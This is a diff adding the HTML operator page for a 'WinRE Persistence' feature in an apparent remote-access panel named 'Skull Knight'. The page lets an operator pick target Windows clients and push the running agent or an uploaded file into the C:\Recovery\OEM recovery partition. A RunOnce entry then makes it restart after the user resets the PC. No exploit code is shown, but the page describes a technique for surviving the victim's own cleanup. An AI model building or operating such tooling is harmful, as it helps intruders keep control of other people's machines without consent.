@@ -1,0 +1,208 @@
+<!doctype html>
+<html lang="en" class="dark">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>WinRE Persistence - Skull Knight</title>
+    <link rel="icon" type="image/x-icon" href="/assets/favicon.ico" />
+    <link rel="stylesheet" href="/assets/tailwind.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link rel="stylesheet" href="/assets/main.css" />
+    <link rel="stylesheet" href="/assets/custom.css" />
+    <script defer src="/assets/toast.js"></script>
+    <script defer src="/assets/ripple.js"></script>
+  </head>
+  <body class="min-h-screen bg-slate-950 text-slate-100">
+    <header id="top-nav"></header>
+
+    <main class="w-full px-4 sm:px-6 lg:px-8 py-8">
+      <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+        <!-- Client Selector -->
+        <div class="lg:col-span-3">
+          <div class="bg-slate-900/70 rounded-xl border border-slate-800 p-6">
+            <div class="flex items-center justify-between mb-4">
+              <div>
+                <h2 class="text-xl font-semibold">Select Target Clients</h2>
+                <p class="text-sm text-slate-400">
+                  Windows clients only &mdash; requires admin privileges on the target
+                </p>
+              </div>
+              <div class="flex items-center gap-2 text-sm text-slate-400">
+                <span id="selected-count">0 selected</span>
+                <button
+                  id="clear-selection-btn"
+                  class="px-3 py-1 rounded-lg border border-slate-700 bg-slate-800/50 hover:bg-slate-700 transition-colors"
+                >
+                  <i class="fa-solid fa-xmark"></i> Clear
+                </button>
+              </div>
+            </div>
+
+            <!-- Search and Filters -->
+            <div class="flex gap-3 mb-4">
+              <div class="flex-1 relative">
+                <i class="fa-solid fa-search absolute left-3 top-1/2 -translate-y-1/2 text-slate-500"></i>
+                <input
+                  id="client-search"
+                  type="text"
+                  placeholder="Search by hostname, ID, or user..."
+                  class="w-full pl-10 pr-4 py-2 rounded-lg border border-slate-700 bg-slate-800 text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-500"
+                />
+              </div>
+              <button
+                id="select-all-btn"
+                class="px-4 py-2 rounded-lg border border-slate-700 bg-slate-800/50 hover:bg-slate-700 transition-colors whitespace-nowrap"
+              >
+                <i class="fa-solid fa-check-double"></i> Select All
+              </button>
+            </div>
+
+            <!-- Client List -->
+            <div
+              id="client-list"
+              class="max-h-64 overflow-y-auto border border-slate-700 rounded-lg bg-slate-950"
+            >
+              <div class="p-4 text-center text-slate-500">Loading clients...</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- WinRE Persistence Form -->
+        <div class="lg:col-span-3">
+          <div class="bg-slate-900/70 rounded-xl border border-slate-800 p-6">
+            <div class="flex items-center justify-between mb-4">
+              <div>
+                <h2 class="text-xl font-semibold">
+                  <i class="fa-solid fa-shield-halved text-amber-400 mr-2"></i>WinRE Persistence
+                </h2>
+                <p class="text-sm text-slate-400">
+                  Survive Windows push resets &mdash; the file will start after the user signs in post-reset
+                </p>
+              </div>
+              <div class="flex flex-wrap items-center gap-2">
+                <button
+                  id="install-self-btn"
+                  class="px-6 py-2 rounded-lg bg-amber-600 hover:bg-amber-700 text-white font-semibold disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
+                >
+                  <i class="fa-solid fa-rotate-left"></i> Install (Current Agent)
+                </button>
+                <button
+                  id="install-file-btn"
+                  class="px-6 py-2 rounded-lg bg-cyan-600 hover:bg-cyan-700 text-white font-semibold disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
+                >
+                  <i class="fa-solid fa-cloud-arrow-up"></i> Install (Upload File)
+                </button>
+                <button
+                  id="uninstall-btn"
+                  class="px-6 py-2 rounded-lg bg-red-600 hover:bg-red-700 text-white font-semibold disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
+                >
+                  <i class="fa-solid fa-trash-can"></i> Uninstall
+                </button>
+              </div>
+            </div>
+
+            <div class="space-y-4">
+              <!-- Source mode tabs -->
+              <div class="flex gap-1 p-1 rounded-lg bg-slate-950/60 border border-slate-800 w-fit">
+                <button id="tab-self" class="px-4 py-1.5 rounded-md text-sm font-medium bg-slate-700 text-slate-100 transition-colors">
+                  <i class="fa-solid fa-robot mr-1"></i> Current Agent EXE
+                </button>
+                <button id="tab-upload" class="px-4 py-1.5 rounded-md text-sm font-medium text-slate-400 hover:text-slate-100 transition-colors">
+                  <i class="fa-solid fa-cloud-arrow-up mr-1"></i> Upload File
+                </button>
+              </div>
+
+              <!-- Self panel -->
+              <div id="panel-self">
+                <div class="rounded-lg border border-slate-800 bg-slate-950/60 p-4 text-sm text-slate-300">
+                  <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 rounded-full bg-amber-900/40 flex items-center justify-center text-amber-300">
+                      <i class="fa-solid fa-robot"></i>
+                    </div>
+                    <div>
+                      <div class="font-semibold text-slate-100">Use the currently running agent</div>
+                      <div class="text-xs text-slate-500">
+                        The agent will copy its own executable into the WinRE recovery partition.
+                        After a push reset, it will auto-start when the user signs in.
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Upload panel -->
+              <div id="panel-upload" class="hidden">
+                <div
+                  id="upload-zone"
+                  class="border-2 border-dashed border-slate-700 rounded-xl p-6 bg-slate-950/60 hover:border-cyan-500 transition-colors cursor-pointer"
+                >
+                  <div class="flex items-center gap-4">
+                    <div class="w-12 h-12 rounded-full bg-cyan-900/40 flex items-center justify-center text-cyan-300">
+                      <i class="fa-solid fa-cloud-arrow-up"></i>
+                    </div>
+                    <div>
+                      <div class="font-semibold text-slate-100">Drag & drop a file</div>
+                      <div class="text-sm text-slate-400">or click to select a file to persist through reset</div>
+                    </div>
+                  </div>
+                  <input id="upload-input" type="file" class="hidden" />
+                </div>
+                <div class="mt-3 text-sm text-slate-400" id="upload-status">
+                  No file uploaded yet.
+                </div>
+              </div>
+
+              <!-- Info box -->
+              <div class="rounded-lg border border-amber-800/50 bg-amber-950/30 p-4 text-sm text-slate-300">
+                <div class="flex items-start gap-3">
+                  <i class="fa-solid fa-triangle-exclamation text-amber-400 mt-0.5"></i>
+                  <div>
+                    <div class="font-semibold text-amber-200 mb-1">Requirements &amp; Notes</div>
+                    <ul class="space-y-1 text-slate-400 list-disc list-inside">
+                      <li>Requires <strong>Administrator privileges</strong> on the target machine</li>
+                      <li>Windows only &mdash; uses the Recovery\OEM ResetConfig mechanism</li>
+                      <li>The file is placed in <code class="text-xs bg-slate-800 px-1 rounded">C:\Recovery\OEM\</code> and a RunOnce registry entry is created during reset</li>
+                      <li>After a push reset (Settings &rarr; Recovery &rarr; Reset this PC), the file will auto-run on first sign-in</li>
+                      <li>Uninstall removes the entire OEM recovery directory</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Output -->
+        <div class="lg:col-span-3">
+          <div class="bg-slate-900/70 rounded-xl border border-slate-800 p-6">
+            <div class="flex items-center justify-between mb-4">
+              <h2 class="text-xl font-semibold">Results</h2>
+              <button
+                id="clear-output-btn"
+                class="px-4 py-2 rounded-lg border border-slate-700 bg-slate-800/50 hover:bg-slate-700 text-sm"
+              >
+                <i class="fa-solid fa-trash"></i> Clear
+              </button>
+            </div>
+            <div
+              id="output-container"
+              class="min-h-64 max-h-96 overflow-auto px-4 py-3 rounded-lg border border-slate-700 bg-slate-950 text-slate-100 font-mono text-sm whitespace-pre-wrap"
+            >
+              <div class="text-slate-500">
+                No commands dispatched yet.
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <script type="module" src="/assets/nav.js"></script>
+    <script type="module" src="/assets/winre.js"></script>
+  </body>
+</html>
